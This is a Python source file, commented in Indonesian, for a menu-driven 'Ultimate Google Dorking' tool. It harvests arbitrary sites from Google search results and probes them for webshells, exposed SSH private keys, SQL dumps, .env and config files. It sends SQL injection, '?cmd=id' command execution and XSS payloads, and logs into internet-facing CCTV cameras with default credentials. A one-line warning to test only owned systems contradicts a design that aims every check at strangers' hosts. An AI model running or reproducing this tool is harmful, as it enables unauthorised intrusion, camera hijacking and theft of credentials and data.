import requests
from colorama import Fore, Style, init
from googlesearch import search
import re
import logging
import time  # Import pustaka time

init(autoreset=True)

# Konfigurasi logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class GoogleDorking:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.results = []
        self.webshells = [
            'c99.php', 'wso.php', 'b374k.php', 'shell.php',
            'upload.php', 'cmd.php', 'shellexec.php', 'killer.php'
        ]
        self.cctv_dorks = [
            'inurl:/viewer.html?mode=motion',
            'intitle:"Live View / - AXIS"',
            'inurl:/view.shtml',
            'intitle:"webcamXP 5"',
            'inurl:/lvappl'
        ]
        self.ssh_keys = [
            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
            'authorized_keys', 'known_hosts'
        ]

    def _search_google(self, dork, num_results=50):
        """Melakukan pencarian Google dengan penanganan error."""
        try:
            print(Fore.YELLOW + f"[~] Searching with Google Dork: {dork}")
            for url in search(dork, num_results=num_results):  # Hapus pause
                self.results.append(url)
                print(Fore.CYAN + f"[+] Found: {url}")
                time.sleep(2)  # Jeda 2 detik setelah setiap hasil
                if len(self.results) >= num_results:  # Hentikan jika mencapai batas
                    break
            return True
        except Exception as e:
            print(Fore.RED + f"[!] Error during Google search: {str(e)}")
            logging.error(f"Google search error: {str(e)}")
            return False

    def _check_url(self, url, path, search_string=None):
        """Fungsi utility untuk memeriksa URL dan kontennya."""
        try:
            response = self.session.get(url + path, timeout=10)  # Tambahkan timeout
            response.raise_for_status()  # Raise HTTPError untuk kode status yang buruk

            if search_string:
                if search_string in response.text:
                    return True
            else:
                return response.status_code == 200
        except requests.exceptions.RequestException as e:
            logging.warning(f"Request error for {url + path}: {e}")  # Gunakan logging
            return False
        except Exception as e:
            logging.error(f"Error checking {url + path}: {e}")
            return False

    def _has_results(self):
        """Memeriksa apakah ada hasil pencarian."""
        if not self.results:
            print(Fore.RED + "[!] No results to check. Search first!")
            return False
        return True

    def check_webshell(self, url):
        """Memeriksa keberadaan webshell."""
        for shell in self.webshells:
            if self._check_url(url, '/' + shell):
                print(Fore.RED + f"[!] Webshell Found: {url}/{shell}")
                return True
        return False

    def check_cctv_vuln(self, url):
        """Memeriksa kerentanan CCTV umum."""
        endpoints = [
            '/config/getuser?index=0',
            '/system.ini?loginuse&loginpas',
            '/videostream.cgi',
            '/snapshot.cgi'
        ]
        for endpoint in endpoints:
            if self._check_url(url, endpoint):
                print(Fore.RED + f"[!] CCTV Vulnerability Found: {url}{endpoint}")
                return True
        return False

    def exploit_cctv(self, url):
        """Mencoba mengeksploitasi CCTV dengan kredensial default (HANYA UNTUK PENGUJIAN!)."""
        print(Fore.YELLOW + f"[!] WARNING: Attempting to exploit CCTV with default credentials. Use ONLY on systems you own or have permission to test!")
        creds = [
            ('admin', 'admin'),
            ('admin', '12345'),
            ('admin', 'password'),
            ('root', 'root')
        ]
        for user, pwd in creds:
            try:
                response = self.session.get(url + '/login.cgi', auth=(user, pwd), timeout=10)
                response.raise_for_status()
                if 'Login Failed' not in response.text:
                    print(Fore.GREEN + f"[+] CCTV Login Success: {user}:{pwd} - {url}")
                    return True
            except requests.exceptions.RequestException as e:
                logging.warning(f"Login attempt failed for {url} with {user}:{pwd}: {e}")
            except Exception as e:
                logging.error(f"Error during CCTV login attempt for {url}: {e}")
        return False

    def check_ssh_keys(self, url):
        """Memeriksa eksposur kunci SSH."""
        for key in self.ssh_keys:
            if self._check_url(url, '/' + key, 'BEGIN RSA PRIVATE KEY') or self._check_url(url, '/' + key, 'ssh-rsa'):
                print(Fore.RED + f"[!] SSH Key Found: {url}/{key}")
                return True
        return False

    def check_database_exposure(self, url):
        """Memeriksa eksposur file database."""
        db_files = [
            '/db.sql',
            '/database.sql',
            '/backup.sql',
            '/wp-content/db.php',
            '/config/database.php'
        ]
        for db_file in db_files:
            if self._check_url(url, db_file, 'CREATE TABLE') or self._check_url(url, db_file, 'INSERT INTO'):
                print(Fore.RED + f"[!] Database Dump Found: {url}{db_file}")
                return True
        return False

    def check_sqli(self, url):
        """Memeriksa kerentanan injeksi SQL."""
        if self._check_url(url, "'", "SQL syntax") or self._check_url(url, "'", "mysql_fetch"):
            print(Fore.RED + f"[!] SQL Injection Vulnerability Found: {url}")
            return True
        return False

    def check_rce(self, url):
        """Memeriksa kerentanan eksekusi kode jarak jauh (RCE)."""
        if self._check_url(url, "?cmd=id", "uid="):
            print(Fore.RED + f"[!] RCE Vulnerability Found: {url}")
            return True
        return False

    def check_xss(self, url):
        """Memeriksa kerentanan XSS."""
        payload = "<script>alert('XSS')</script>"
        if self._check_url(url, f"?q={payload}", payload):
            print(Fore.RED + f"[!] XSS Vulnerability Found: {url}")
            return True
        return False

    def check_kcfinder(self, url):
        """Memeriksa keberadaan KCFinder."""
        if self._check_url(url, "/kcfinder/browse.php", "kcfinder"):
            print(Fore.RED + f"[!] KCFinder Found: {url}")
            return True
        return False

    def check_wp_register(self, url):
        """Memeriksa apakah pendaftaran WordPress diaktifkan."""
        if self._check_url(url, "/wp-login.php?action=register", "Registration Form"):
            print(Fore.RED + f"[!] WordPress Registration Enabled: {url}")
            return True
        return False

    def check_file_upload(self, url):
        """Memeriksa keberadaan formulir unggah file."""
        if self._check_url(url, "/upload.php", "Upload"):
            print(Fore.RED + f"[!] File Upload Found: {url}")
            return True
        return False

    def check_phpinfo(self, url):
        """Memeriksa keberadaan halaman phpinfo()."""
        if self._check_url(url, "/phpinfo.php", "phpinfo()"):
            print(Fore.RED + f"[!] phpinfo() Found: {url}")
            return True
        return False

    def check_admin_panel(self, url):
        """Memeriksa keberadaan panel admin."""
        if self._check_url(url, "/admin", "Login"):
            print(Fore.RED + f"[!] Admin Panel Found: {url}")
            return True
        return False

    def check_config_files(self, url):
        """Memeriksa keberadaan file konfigurasi."""
        if self._check_url(url, "/config.php", "db_host"):
            print(Fore.RED + f"[!] Config File Found: {url}")
            return True
        return False

    def check_backup_files(self, url):
        """Memeriksa keberadaan file backup."""
        try:
            response = self.session.get(url + "/backup.zip", timeout=10)  # Tambahkan timeout
            response.raise_for_status()
            if response.status_code == 200:
                print(Fore.RED + f"[!] Backup File Found: {url}")
                return True
        except requests.exceptions.RequestException as e:
            logging.warning(f"Error checking backup file at {url}: {e}")
            return False
        return False

    def check_debug_mode(self, url):
        """Memeriksa apakah mode debug diaktifkan."""
        if self._check_url(url, "/.env", "APP_DEBUG=true"):
            print(Fore.RED + f"[!] Debug Mode Enabled: {url}")
            return True
        return False

    def check_open_redirect(self, url):
        """Memeriksa kerentanan pengalihan terbuka (open redirect)."""
        if self._check_url(url, "/redirect?url=https://evil.com", "evil.com"):
            print(Fore.RED + f"[!] Open Redirect Found: {url}")
            return True
        return False

    def check_directory_listing(self, url):
        """Memeriksa apakah daftar direktori diaktifkan."""
        if self._check_url(url, "/images/", "Index of /images"):
            print(Fore.RED + f"[!] Directory Listing Enabled: {url}")
            return True
        return False

    def check_cors_misconfig(self, url):
        """Memeriksa kesalahan konfigurasi CORS."""
        try:
            response = self.session.get(url, headers={"Origin": "https://evil.com"}, timeout=10)
            response.raise_for_status()
            if "Access-Control-Allow-Origin: https://evil.com" in response.headers.get("Access-Control-Allow-Origin", ""):
                print(Fore.RED + f"[!] CORS Misconfiguration Found: {url}")
                return True
        except requests.exceptions.RequestException as e:
            logging.warning(f"Error checking CORS at {url}: {e}")
            return False
        return False

    def show_menu(self):
        print(Fore.CYAN + "\n=== Ultimate Google Dorking ===")
        print(Fore.YELLOW + "1. Custom Google Dork")
        print(Fore.YELLOW + "2. Webshell Dork (Auto Scan)")
        print(Fore.YELLOW + "3. CCTV Dork (Auto Exploit) - USE WITH CAUTION")
        print(Fore.YELLOW + "4. SSH Key Exposure")
        print(Fore.YELLOW + "5. Database Exposure Check")
        print(Fore.YELLOW + "6. SQL Injection Check")
        print(Fore.YELLOW + "7. RCE Check")
        print(Fore.YELLOW + "8. XSS Check")
        print(Fore.YELLOW + "9. KCFinder Check")
        print(Fore.YELLOW + "10. WordPress Registration Check")
        print(Fore.YELLOW + "11. File Upload Check")
        print(Fore.YELLOW + "12. phpinfo() Check")
        print(Fore.YELLOW + "13. Admin Panel Check")
        print(Fore.YELLOW + "14. Config Files Check")
        print(Fore.YELLOW + "15. Backup Files Check")
        print(Fore.YELLOW + "16. Debug Mode Check")
        print(Fore.YELLOW + "17. Open Redirect Check")
        print(Fore.YELLOW + "18. Directory Listing Check")
        print(Fore.YELLOW + "19. CORS Misconfiguration Check")
        print(Fore.YELLOW + "20. Full Vulnerability Scan")
        print(Fore.RED + "0. Exit")

    def run(self):
        while True:
            self.show_menu()
            choice = input(Fore.CYAN + "\n[+] Select option (0-20): ")

            if choice == '1':
                dork = input(Fore.CYAN + "[+] Enter Google Dork: ").strip()
                self._search_google(dork, 50)

            elif choice == '2':
                print(Fore.YELLOW + "[~] Scanning for Webshells...")
                for shell_dork in self.webshells:
                    self._search_google(f'inurl:{shell_dork}', 30)
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking Found URLs...")
                    for url in self.results:
                        self.check_webshell(url)

            elif choice == '3':
                print(Fore.YELLOW + "[~] Scanning CCTV Devices...")
                for cctv_dork in self.cctv_dorks:
                    self._search_google(cctv_dork, 50)
                if self._has_results():
                    print(Fore.YELLOW + "[~] Exploiting CCTV Devices...")
                    for url in self.results:
                        self.check_cctv_vuln(url)
                        self.exploit_cctv(url)

            elif choice == '4':
                print(Fore.YELLOW + "[~] Scanning for SSH Keys...")
                self._search_google('inurl:id_rsa OR inurl:id_dsa OR inurl:authorized_keys', 50)
                if self._has_results():
                    for url in self.results:
                        self.check_ssh_keys(url)

            elif choice == '5':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking Database Exposures...")
                    for url in self.results:
                        self.check_database_exposure(url)

            elif choice == '6':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for SQL Injection...")
                    for url in self.results:
                        self.check_sqli(url)

            elif choice == '7':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for RCE...")
                    for url in self.results:
                        self.check_rce(url)

            elif choice == '8':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for XSS...")
                    for url in self.results:
                        self.check_xss(url)

            elif choice == '9':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for KCFinder...")
                    for url in self.results:
                        self.check_kcfinder(url)

            elif choice == '10':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for WordPress Registration...")
                    for url in self.results:
                        self.check_wp_register(url)

            elif choice == '11':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for File Upload...")
                    for url in self.results:
                        self.check_file_upload(url)

            elif choice == '12':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for phpinfo()...")
                    for url in self.results:
                        self.check_phpinfo(url)

            elif choice == '13':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Admin Panel...")
                    for url in self.results:
                        self.check_admin_panel(url)

            elif choice == '14':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Config Files...")
                    for url in self.results:
                        self.check_config_files(url)

            elif choice == '15':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Backup Files...")
                    for url in self.results:
                        self.check_backup_files(url)

            elif choice == '16':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Debug Mode...")
                    for url in self.results:
                        self.check_debug_mode(url)

            elif choice == '17':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Open Redirect...")
                    for url in self.results:
                        self.check_open_redirect(url)

            elif choice == '18':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for Directory Listing...")
                    for url in self.results:
                        self.check_directory_listing(url)

            elif choice == '19':
                if self._has_results():
                    print(Fore.YELLOW + "[~] Checking for CORS Misconfiguration...")
                    for url in self.results:
                        self.check_cors_misconfig(url)

            elif choice == '20':
                print(Fore.YELLOW + "[~] Full Vulnerability Scan...")
                self._search_google('inurl:.php?id=', 100)
                if self._has_results():
                    for url in self.results:
                        self.check_webshell(url)
                        self.check_cctv_vuln(url)
                        self.check_ssh_keys(url)
                        self.check_database_exposure(url)
                        self.check_sqli(url)
                        self.check_rce(url)
                        self.check_xss(url)
                        self.check_kcfinder(url)
                        self.check_wp_register(url)
                        self.check_file_upload(url)
                        self.check_phpinfo(url)
                        self.check_admin_panel(url)
                        self.check_config_files(url)
                        self.check_backup_files(url)
                        self.check_debug_mode(url)
                        self.check_open_redirect(url)
                        self.check_directory_listing(url)
                        self.check_cors_misconfig(url)

            elif choice == '0':
                print(Fore.GREEN + "[!] Exiting...")
                break

            else:
                print(Fore.RED + "[!] Invalid choice!")

            input(Fore.CYAN + "\nPress Enter to continue...")

# Fungsi run() untuk kompatibilitas dengan unknown1337.py
def run():
    dorking = GoogleDorking()
    dorking.run()

if __name__ == "__main__":
    run()
